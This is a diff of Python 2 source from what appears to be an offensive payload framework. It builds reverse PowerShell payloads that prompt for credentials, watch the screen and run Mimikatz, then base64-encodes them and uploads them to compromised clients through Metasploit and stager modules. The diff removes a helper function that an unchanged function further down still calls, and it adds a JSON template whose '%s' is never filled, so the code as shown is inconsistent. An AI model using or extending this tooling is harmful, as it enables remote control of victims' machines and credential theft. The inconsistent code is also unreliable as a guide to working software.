@@ -3,13 +3,6 @@ from payloadextras import *
 from startmetasploit import *
 from generatepayload import *
 
-def checkClientUpload(payloadname, powershellExec, isExe):
-    from menu import clientMenuOptions
-    if len(clientMenuOptions.keys()) > 2:
-        return DoClientUpload(payloaddir(),payloadname,powershellExec,isExe)
-    else:
-        print powershellExec
-
 def reverseIpAndPort(port):
     portnum = raw_input(
         '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
@@ -130,8 +123,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     return "pass"
 
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
-    json = '{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
-    clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
+    clientnumber = int(clientUpload(payloadname,payloadchoice,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
     try:
         for server in returnServerList():
@@ -145,6 +137,8 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
         pass
     return "pass"
 
+
+#update this
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     json = '{"type":"script", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
     clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
